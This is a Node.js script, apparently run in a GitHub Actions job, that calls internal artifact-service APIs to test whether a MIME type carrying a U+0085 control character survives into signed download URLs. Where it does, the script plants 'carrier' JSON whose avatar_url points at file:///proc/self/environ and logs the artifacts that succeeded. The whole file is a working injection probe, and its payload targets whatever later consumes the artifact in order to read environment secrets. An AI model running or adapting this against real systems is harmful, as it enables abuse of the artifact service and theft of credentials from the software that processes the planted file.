import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"version"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const winners = [];

async function create(name, version, mimeType) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version, mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette version carrier',
    stargazers_count: 0,
  }));
}

async function trial(index, version, mimeType) {
  const name = `version-${process.env.GITHUB_RUN_ID}-${index}`;
  const created = await create(name, version, mimeType);
  if (!created.ok) return {index, version, mime: JSON.stringify(mimeType).slice(1, -1), created};
  await upload(created.url, placeholder).catch(() => false);
  const final = await finalize(name);
  const view = await inspect(name);
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index, version, mime: JSON.stringify(mimeType).slice(1, -1),
    created: {ok: true}, final,
    view: view.ok ? {ok: true, contentType: JSON.stringify(view.contentType).slice(1, -1)} : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    row.carrierPlaced = await upload(created.url, carrierBytes(repository)).catch(() => false);
    row.repository = repository;
    if (row.carrierPlaced) winners.push({id: final.id, name, repository});
  }
  return row;
}

const inputs = [];
for (let version = 0; version <= 7; version++) {
  inputs.push([version, odd], [version, 'application/json']);
}
const rows = await Promise.all(inputs.map(([version, mime], index) => trial(index, version, mime)));
for (const row of rows) console.log(`VERSION ${JSON.stringify(row)}`);
const summary = {total: rows.length, odd: rows.filter(r => r.isOdd).length};
console.log(`VERSION_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners, summary, rows,
}, null, 2) + '\n');
